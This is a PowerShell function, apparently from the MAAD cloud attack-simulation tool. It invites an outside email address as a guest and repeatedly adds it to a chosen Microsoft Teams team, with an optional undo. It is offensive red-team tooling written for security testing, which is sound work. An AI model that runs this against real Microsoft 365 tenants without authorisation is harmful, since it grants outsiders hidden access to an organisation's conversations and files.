#External Teams Access

function ExternalTeamsInvite {
    
    mitre_details("ExternalTeamsAccess")

    EnterTeam("`n[?] Enter Display Name of team to generate invitation for")
    $target_team = $global:team_name


    #Create External Account
    try {
        #Attemp inviting account. This will automatically fail and the rest of the module will continue as intended if the account being added is an internal account. 
        #If the account being added is an external account then the account will be invited and the rest of the module will continue.
        $external_email_address = Read-Host -Prompt "`n[?] Enter (ext/int) email to grant access to Teams"
        Write-Host ""

        New-AzureADMSInvitation -InvitedUserDisplayName "$external_email_address" -InvitedUserEmailAddress $external_email_address -InviteRedirectURL https://myapps.microsoft.com -SendInvitationMessage $true | Out-Null
    }
    catch {
        #Do nothing.
    }

    #Retrieve teams group ID
    $team_details = Get-Team -DisplayName $target_team 
    $group_id = $team_details.GroupId

    MAADWriteInfo "This configuration can sometimes take long to take effect"
    [int]$time_limit_min = (Read-Host -Prompt "`n[?] Set wait limit (minutes)")
    Write-Host ""
    [int]$time_limit_sec = $time_limit_min*60
    MAADWriteInfo "Long day - Grab some \_/)" 
    MAADWriteProcess "Config: Invited_Acc($external_email_address) -> Team($target_team)"
    MAADWriteProcess "Confirming change completion"

    #Add to teams group while waiting for the change to take effect
    [int]$timer = 0
    while ($timer -le $time_limit_sec){
        try{
            Add-TeamUser -GroupId $group_id -Role Member -User $external_email_address -ErrorAction Stop
            MAADWriteSuccess "External Entity Added to Teams"
            $allow_undo = $true
            break
        }
        catch{
            Start-sleep -Seconds 60
            $timer = $timer+60
            MAADWriteProcess "Waiting for account to replicate -> Wait status : $(($time_limit_sec - $timer)/60) minutes left"
        }
    } 

    if ($allow_undo -eq $true) {
        $user_choice = Read-Host -Prompt "`n[?] Undo: Remove added user from team (y/n)"
        Write-Host ""
        if ($user_choice -notin "No","no","N","n") {
            MAADWriteProcess "Removing new user from team -> $target_team"
            try {
                Remove-TeamUser -GroupId $group_id -User $external_email_address -ErrorAction Stop
                MAADWriteSuccess "Removed new user from team"
            }
            catch {
                MAADWriteError "Failed to remove new user from team"
            } 
        }
    }
    MAADPause
}